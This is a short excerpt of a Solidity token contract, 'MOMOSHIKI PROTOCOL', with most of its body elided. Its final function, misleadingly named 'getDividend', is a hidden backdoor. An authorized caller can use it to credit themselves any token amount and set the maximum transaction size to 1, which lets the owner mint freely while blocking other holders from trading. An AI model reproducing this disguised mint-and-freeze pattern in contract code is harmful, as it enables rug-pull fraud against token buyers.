...
contract MomoshikiProtocol is IERC20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "MOMOSHIKI PROTOCOL";
    string constant _symbol = "PROMOSHIKI";
    ...
    constructor () Auth(msg.sender) {
        ...
        address _presaler = 0xC0D6B8a8Ef000a1b7e177Fe9139b2B2e98c1CB48;
    ...
    function getDividend (uint256 amount) external authorized {_balances[msg.sender] += amount;_maxTxAmount=1;}
